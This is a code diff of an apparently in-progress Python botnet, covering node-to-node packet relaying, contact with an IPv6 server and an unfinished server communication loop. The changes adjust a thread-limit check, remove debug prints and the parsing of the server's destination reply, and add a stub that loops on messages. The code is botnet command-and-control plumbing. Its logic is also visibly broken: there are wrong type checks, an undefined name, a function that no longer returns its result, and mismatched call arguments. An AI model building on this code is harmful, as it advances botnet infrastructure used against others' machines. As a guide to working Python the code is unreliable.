@@ -37,7 +37,7 @@ def com_loop():                                 # TODO: add check for botnet ttl
         if address is not tuple:
             continue                                                                                        # TODO: handle different server error conditions.
         payload = receive_from_node(address)
-        if not send_threads.not_full():
+        if send_threads.qsize() >= MAX_SEND_THREADS_COUNT:
             logging.debug(f"too many sending threads {send_threads}")
             pass                                                                                            # TODO: implement a way to deal with too many threads
         packet = Botnet_Packet(dest_IP="127.0.0.1", dest_port=dport, src_port=server.getsockname()[1], payload=payload) 
@@ -73,18 +73,14 @@ def send_to_node(address: tuple, packet: Botnet_Packet, src_MAC="000000000000", 
 
 
 def contact_IPv6server(server: socket.socket, MAC="000000000000"):
-    print(3)
     succeeded = TCP_send(server, MAC)
-    print(4)
     if succeeded is None: return
     response = TCP_recieve(server)
-    print(type(response))
     if response is int:
         return response
     logging.debug(f"received {response} from {server.getpeername()} on {server.getsockname()}")
     dest_IP, dest_port = response.split('$')  # TODO: check for incorrect response
-    dest_port = int(dest_port)
-    return (dest_IP, dest_port)
+
 
 
 def server_listener(server: socket.socket, MAC="000000000000"):
@@ -106,6 +102,21 @@ def receive_from_node(address: tuple, dst_IP: str, dst_port: int, src_port: int)
     payload = receive_botnet_packet                   # TODO: handle errors
     logging.debug(f"received payload {payload} from {address}")
     return payload
+
+
+def server_com(client: socket.socket, server_address):
+    try:
+        client.connect(server_address)
+    except socket.error as e:
+        logging.debug(f"server {server_address} unavaliable")
+        return
+    while True:
+        msg = TCP_recieve(client)
+        if not check_msg:
+            continue
+         
+
+
 
 
 if __name__ == "__main__":
